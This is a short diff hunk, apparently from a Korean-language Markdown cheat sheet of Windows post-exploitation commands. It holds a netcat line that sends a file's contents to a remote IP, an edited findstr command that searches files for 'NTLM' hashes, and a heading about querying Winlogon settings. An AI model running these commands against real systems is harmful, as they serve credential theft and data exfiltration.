@@ -6,7 +6,7 @@ nc 10.10.10.10 80 < file.txt
 
 ## findstr
 ```powershelll
-type <file> | findstr 'NTLM'
+type <file> | findstr /I /N 'NTLM'
 ```
 ---
 ## Winlogon 설정값 조회
